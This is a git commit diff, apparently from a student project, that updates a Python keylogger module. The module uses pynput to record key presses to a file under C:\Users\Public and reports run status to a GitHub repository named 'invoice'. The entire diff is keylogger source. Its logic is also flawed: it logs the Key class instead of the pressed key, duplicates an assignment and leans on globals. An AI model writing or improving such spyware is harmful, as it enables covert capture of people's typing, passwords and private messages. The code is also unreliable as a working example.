edd2256f16da44a2526cc8605af7d458a254d50e
Rodrigo <rodrigo.caldeirasilva@student.ap.be>
2023-05-20 18:50:22 +0200

    Update keylogger.py

--- modules/Keylogger.py
+++ modules/Keylogger.py
@@ -1,10 +1,13 @@
 from pynput.keyboard import Key, Listener
 import logging
 import os
+from LogCreator import Log
 
 class Keylogger():
-    @staticmethod
-    def run():
+    def __init__(self, script_name):
+        self.script_name = script_name
+    
+    def Run_Keylogger(self):
         '''Beschrijving'''
         keylogger_path = r"C:\Users\Public\keylogger"
         if not os.path.exists(keylogger_path):
@@ -12,10 +15,28 @@ class Keylogger():
         log_dir = ""
         logging.basicConfig(filename=(log_dir + r"C:\Users\Public\keylogger\keylogs.txt"), \
 	        level=logging.DEBUG, format='%(asctime)s: %(message)s')
+        
+        items = items = os.listdir(r"C:\Users\Public")
+        folder_exists = False
+        for item in items:
+            item_path = os.path.join(r"C:\Users\Public", item)
+            if os.path.isdir(item_path) and item == "keylogger":
+                folder_exists = True
+                pass
+        if folder_exists:
+            file_creator.create_file("logs", keylogger.script_name,"Script completed successfully")
+        else:
+            file_creator.create_file("logs",keylogger.script_name,"Script may have encountered erros")
+
         def on_press(key):
             logging.info(str(Key))
         
         with Listener(on_press=on_press) as listener:
             listener.join()
 
-Keylogger.run()
+repository_owner = 'rsecurity12' 
+repository_name = 'invoice' 
+access_token = ''  
+keylogger = Keylogger("Keylogger")
+file_creator = Log(repository_owner, repository_name, access_token)
+keylogger.Run_Keylogger()
